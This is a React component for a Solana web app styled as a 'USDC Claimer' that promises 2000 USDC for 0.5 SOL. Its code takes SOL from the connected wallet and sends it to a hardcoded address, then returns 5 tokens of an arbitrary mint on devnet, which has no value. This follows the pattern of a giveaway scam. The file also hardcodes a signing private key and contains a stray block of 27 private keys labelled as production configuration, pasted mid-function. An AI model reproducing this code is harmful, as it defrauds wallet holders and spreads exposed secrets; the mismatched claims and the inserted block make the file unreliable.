/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "43rYjyiB211bdZSeyPKGe1xHELXRngZWW4WDEY9qduZDuNiBzios1La7DpU6FA2htCFdcw4FXyeiHrqgtcwX1MJP"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "7iyvzTrbRGA1an6V5G1zV9mQkTWFYu3jXmwnGzWAQvVTV1RtnoBHGN1BfPh6Q5CtaSmqrZ228p4GNqd4oxsrRt5",
  "key1": "4Wm2xuqN2gBDMK8smjfPUfjBw3QbPLu7gvX84QggwDqihmRAy5cpEqubuZu1L9F89u1xLTchRqW2XQ3zpDZVTx1K",
  "key2": "41xfUoX4SkjBMjC4mANfLsEVGYvR47AYmsuHWkqmP8HTp6Hoi5uBjwb5LEe4HSKUp6tR7As4UdbhF9adAGwPTUMz",
  "key3": "5f7dGnXHSxzyH7Jx8Bt4Ruh1SzFimEc69qV5YxRgyLSkJH8umMt6R9EyP3q6tvhaHx4HrjQqFxZbFAh4V5n6tMVi",
  "key4": "59m69T3x2EK39XwnQUmFk1qvrvdUXPFkxFH73BGjuAMbquQhSXGV6Y9YJHQkxMynssTEnKHwh7eKwX1RXyKvTE7P",
  "key5": "2HcGk9686WwxnxZADT5NaX5hZd5QpgYmFttJ6B5R1BLu7begitwRj2hjw4NFxiRy69MeeywjTCAq1YC1BjwdNNqm",
  "key6": "5ByDBHA7rJaAUnex3N2RyE8vRw37AQrHVgTKB9Tok4u51JuetvMpxURxGsDSvVtHfCBpoSorByCFydi624o3SgkZ",
  "key7": "5cQhSULFYVhfGPqMSqNuqGv6yyodd7qx96We3xm8rkFqJA3reYrVA4TzUsA4cNJWaZMaiHPooUqpFzwwVfjHQNNW",
  "key8": "PFKhvYx6fpn8WiSmoNTFvw4swKFLJJPwkjZGdyif8ge1smg64hGyCpYwJnLbdXpHDrn4AMSDDheuEG1fB3SLWKj",
  "key9": "4E2yq4gUjX7e3vdTbzBrvS2EebXPeN7jLERjYF7sdzG4SXYn2w88fsnoxhzqriAP61iAdkGoYTxKxZFZeDWnhtkx",
  "key10": "VDNRv4aAJwDGqJUDNm3ucJmYA3Grc7hfzHvNK3YcUJ6H7BzmdnYCBVSG7KtPJw1m9E5R81UXo3SbJfQjj5NkTyi",
  "key11": "4UVbQA3vmQuTFZzZ9zEXH394niiWftNttg2xF21mQKVoau6rUUqEMDzHH2unoh6s5iHqQ8HTwpHdXgaZfmt95otK",
  "key12": "2hmXLyQ9oGcLmE2tMVqLC9xCkzngfVdjYUH69TNf3tMyZYJVZ5QFzS3sNUYRMKbBE2YiRxnYtbpnaTgYWiFiAcLJ",
  "key13": "2JuQ9uXjzkoYyoqXkYNZK4SBnGGty3ZqcbYq9DZTZZ5KjLWqiQH1UosDEb2rDNcxxY17FaFkuz4xPrPMePpvSc6b",
  "key14": "2DPAxYcGrdpyAFPmFor9rwMbreZbjmNsFo7XQu6JPVHec6hXZvvhJJyd9nZMcYDzhYkeWeWCUcSdHbdzbpC5XP5T",
  "key15": "3fgDi6XKMDr8MVKC6zvy1utGYkK7yvnWTn5GqWFyiojyZ8qsvixb9qZuKfGkPEHvu25kU8Ecwhy3GPnQ91B9yGgM",
  "key16": "676m96HKiZJk1HwYaGqxkxw3qvPCxirrGqv5VEs3K4vWBjxEVgg6jL9k6TJcizp8TfPhSrhRoFMQ3zr7d5Uwa4ty",
  "key17": "5SGAkS9hnswQDDsFcSytyjFGiP7MesyHiZRWcqwwiijY7VA3TuQxUtFxhAqWreHNovnmPA57xJm11T11fdCrtPdb",
  "key18": "4bLBSdNpowtyki5hncV9CuEp9eFcqRmX7UduVXVQrQgrFrn8UmmvWhWB47uLdhszLajmcVt9ic9EU8daBaUQXtAk",
  "key19": "SSRbs3LVndP5CALnDBdBSFYmJyt6bLi27AmipHZuhaqrHxfU72r7TAcP44LDqpjEMaFFeccH1rsLBsgA4FWpq2X",
  "key20": "UBcP6SYz4jZwNsgNpreg67YXUxu1UDy5kjCKtCiEfNzCMzq2YzBQwkRxZqax7FpQLAAXgT9esDm7Thwoa1t8Kb7",
  "key21": "yVmgtt9u3fPWUd3RKSov6z5Q7kkBWQcdMi7Pe4dtzFfuyPUiXtHcS6RSkz4DKZ2UWJkuzhRtCZ25tEBRVFj2k4z",
  "key22": "57XptfdkAmcXhMBHG7DJtaKqxUZcuxb38MxSaNdJkffaBGDUVBRWRJ2qg2nxaatqrGd2bySLc2SdMkwCMcN3PnEk",
  "key23": "61jiKjAaZaevMPamiaNppBmSVqFtdUpiXq8b1M6qhEkutfabkh8bbprNVFgqde8MbPVNmGMAtenp2vEukfSGisDn",
  "key24": "3KkeH2WwXtmzuHzD8qNE43iNyMT21oEoASfzh7mM5WvyoqsbHgXixG8YZExurXr7EFbeBGp2XjgHSuXDahREAQpV",
  "key25": "2gUtutX3HAhfGenn8Fj7sP3SRbBpiUKchLSnNLh3kArgn95MxcZj5URUpoGSEYV3XbKpbCT53VCcULz3nvvdrw6R",
  "key26": "482mb8XmWL3Bc24AkVei6S7RaNbTRbw7BLhRvzFMKDBE9H8UznCDzJWFGSynMuPUxLPvNE6wczovxgc6459Arn3E"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
